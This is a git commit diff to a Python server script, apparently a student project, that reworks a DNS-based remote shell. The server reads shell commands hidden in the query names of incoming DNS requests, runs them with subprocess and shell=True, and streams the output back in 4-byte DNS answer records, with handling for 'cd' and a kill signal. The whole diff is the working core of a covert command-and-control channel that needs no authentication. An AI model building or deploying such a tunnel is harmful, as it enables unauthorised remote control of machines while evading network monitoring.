39f15550c57c5a239dfe868693eda35a08d0d367
dabaldassi <david.baldassin@etu.uca.fr>
2019-02-06 15:06:15 +0100

    read directly into the subprocess stdout because communicate was blocking

--- src/serveur.py
+++ src/serveur.py
@@ -6,18 +6,38 @@ import socket
 import subprocess
 from message import *
 
+"""
+splitRR split a string into an array of RR with the type t and a size of size bytes
+and the ending sequence of our protocol (0000)
+"""
+
+def splitRR(string,t,size):
+    a = [RR("",string[j:j+size], t, 1, 1) for j in range(0,len(string),size)] # Create subpart of the answer
+    req = len(a) # Number of answer to send
+    l = len(a[req - 1].rdata)
+    
+    if(l != size): # If the last answer is less than 4 bytes
+        a[req - 1].rdata += b'\x00' * (size - l)
+        
+    #a.append(RR("",b'\x00' * size, t, 1, 1)) # Ending sequence
+
+    return a
+
+
 serversocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 if(len(sys.argv) == 2):
     serversocket.bind((sys.argv[1], 53))
 else:
-    print("Argument error, socket bind on 127.0.0.1")
+    print("No ip adress found, socket bind on 127.0.0.1")
     serversocket.bind(("127.0.0.1",53))
 
 last = ""
-res = b'\x01\x01\x01\x01'
-req_left = 0
-req = 0
+p = None
+type_RR = 1
+nb_bytes = 4
+answer_array = []
+ending = b'\x00'*nb_bytes
 
 while True:
     data, ad = serversocket.recvfrom(4096)
@@ -27,7 +47,7 @@ while True:
     cmd = q.qList[0].qname.split(".")
     
     if(cmd[0] != "devtoplay"):
-        if(last != cmd[0] and req_left == 0):
+        if(last != cmd[0] and p is None and len(answer_array) == 0):
             cmd[0] = cmd[0].replace("\x07",".")
             i = 0
             while(cmd[0][i] >= "0" and cmd[0][i] <= "9"): # split salt and command
@@ -35,45 +55,45 @@ while True:
             
             if("cd" in cmd[0][i:]): # cd is a built-in command so we can't use subprocess
                 os.chdir(cmd[0][i+3:])
-                res=b'\x00\x00\x00\x00' # No return
+                answer_array = [RR("",b'\x00' * nb_bytes, type_RR, 1, 1)]
             else:
-                p = subprocess.Popen(cmd[0][i:], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True) # Run command in a subprocess
-                res,err = p.communicate() # Get the output
-
-                if(res is None or res == b''):
-                    res = err
-
-                if(res is None):
-                    res = b''
+                p = subprocess.Popen(cmd[0][i:],
+                                     stdout=subprocess.PIPE,
+                                     stderr=subprocess.STDOUT,
+                                     shell=True) # Run command in a subprocess
                 
-                sel = int(cmd[0][:i],10)
-                a = [RR("",res[j:j+4], 1, 1, 1) for j in range(0,len(res),4)] # Create subpart of the answer
-                req_left = len(a) # Number of answer to send
-                l = len(a[req_left - 1].rdata)
-                
-                if(l != 4): # If the last answer is less than 4 bytes
-                    a[req_left - 1].rdata += b'\x00' * (4 - l)
-                    
-                a.append(RR("",b'\x00\x00\x00\x00', 1, 1, 1)) # Ending sequence
-                req_left += 1
-                req = 0
-
-    if(req  < req_left):
+    if(p is not None): # If there is still something to read
+        out = p.stdout.readline() # Read the output of the process
+        
+        if(p.poll() or out != b''): # b'' means the end of the file
+            answer_array += splitRR(out,type_RR,nb_bytes) # Convert it into an array of RR
+        else:
+            p = None
+            answer_array.append(RR("",b'\x00' * nb_bytes, type_RR, 1, 1))
+        
+    if(len(answer_array) > 0):
+        
         if(cmd[0] != last):
             if "SIGINT" in cmd[0]:
-                req = len(a) - 1
+                answer_array = [answer_array[-1]]
+                
+                if(p is not None and p.poll() is None): # If the process is still running, kill it
+                    p.kill()
+                    p = None
             
-            answer = a[req]
-            a[req].name = q.qList[0].qname
-            req += 1
-            if(req == req_left):
-                req_left = 0
+            answer = answer_array.pop(0)
             
-        message = Message(Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 1, 0, 0), q.qList, [answer])
-        
+            if(answer == ending):
+                p = None
     else:
-        message = Message(Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 1, 0, 0), q.qList, [RR(q.qList[0].qname,res, 1, 1, 1)])
-        
+        answer = RR("",b'\x00' * nb_bytes, type_RR, 1, 1)
+
+    print(answer)
+    answer.name = q.qList[0].qname
+    message = Message(
+        Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 1, 0, 0),
+        q.qList,
+        [answer])
     last = cmd[0]
 
 
